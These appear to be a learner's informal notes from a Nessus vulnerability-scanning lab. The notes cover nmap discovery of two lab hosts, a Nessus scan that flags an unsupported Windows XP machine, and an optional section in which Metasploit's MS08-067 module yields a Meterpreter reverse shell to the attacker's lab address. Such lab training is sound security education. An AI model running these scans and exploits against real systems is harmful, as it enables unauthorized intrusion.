#Nessus Lab 
#RCM 8/21
Description

In this lab you will have to use and configure Nessus in order to perform a vulnerability scan against the target machine. However you are not told where the target machine is in the network. You only know it is in the same lab network you are connected to.
Goal

The goal of this lab is to learn how to properly configure Nessus depending on the services running on the target machine.

#Tools
Nmap
Nessus
Metasploit

#Steps
Find a target in the network
Target Subnet: 192.168.99.70/24

Since we do not have any information about our lab network and the hosts attached to it, the first step is to find our target!
Identify the target role
Initial nmap scan `sudo nmap -sn 192.168.99.70/24`
Initial nmap scan results: two hosts up. `192.168.99.50` and `192.168.99.70`
Enumerate more to have one host.
`sudo nmap -sS -sV -O 192.168.99.50,70 -oN morenmap.txt`
-O to know which plugins to use in nessus. 
-sV for service versions
-sS for more info, both hosts responded to syn scan.
`192.168.99.50` running Windows XP
`192.168.99.70` running Debian Linux 2.6.32

Now that we know there is a host on the target network, let us scan the host and gather as much information as we can in order to properly configure the Nessus scan.
Configure Nessus and run the scan:
In Nessus: New Policy>Advanced Scan>Plugins(maybe try all and see)despite knowing we're working with Windows and Linux hosts. 
My Scans>New Scan>User Defined> Nessus_Lab> Targets: `192.168.99.50,70`>Save>Launch
It did take two minutes to run though.
You should have identified few services running on the machine. Configure a new Nessus policy and scan depending on the scan results of the previous step.
Analyze and export the scan results
Nessus Scan results for `192.168.99.50`
There are 20 vulnerabilities
One critical vuln: Microsoft Windows XP Unsupported Installation Detection.
It looks like the eternal blue exploit lolz. nice.
`MS17-010` `Eternal Blue`
Once the scan completes, open the results and analyze them. You will find something very interesting! Moreover export the scan results, you may need them!
[OPTIONAL] Exploit the machine
#Exploitable with:
Metasploit (MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
#this didn't work
The ms08-067 Microsoft Server Service Relative....did
The target machine has few critical vulnerabilities. Once you finish studying the Metasploit module, start the lab over again and try to exploit the machine.

#Let's try our metasploit again hehe
Search ms17-010
Use 0
Default payload?
Options > set RHOSTS 192.168.99.50
set LHOST > (use tap0 config) 192.168.99.71
(not sure if port matters?) also not sure what payload to use.. 

Search ms08-067
use 0
set RHOSTS 
set LHOST
use. 
Got meterpreter reverse shell. yay!
